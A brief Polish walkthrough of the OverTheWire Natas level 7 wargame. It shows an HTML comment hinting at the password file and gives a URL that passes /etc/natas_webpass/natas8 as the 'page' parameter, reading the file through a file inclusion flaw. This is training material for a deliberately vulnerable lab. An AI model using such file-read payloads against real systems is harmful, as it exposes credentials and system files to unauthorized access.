Strona główna zawiera dwa linki: 
- Home
- About

![](Attachments/{7859A6ED-A43A-45DB-B54B-5A0822321B21}.png)
Oba prowadzą do stron które tylko wyświetlają krótki napis "this is the (nazwa podstrony) page". 

W HTML strony głównej znajduje się podpowiedź, że hasło do kolejnego poziomu jest w danym katalogu.

``` HTML
<!-- hint: password for webuser natas8 is in /etc/natas_webpass/natas8 -->
```

Dopisanie tej ścieżki w miejsce parametru page w url strony zwraca hasło.

``` url
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8
```
![](Attachments/{2EED06DA-7A89-4DF8-8136-08662643D33F}.png)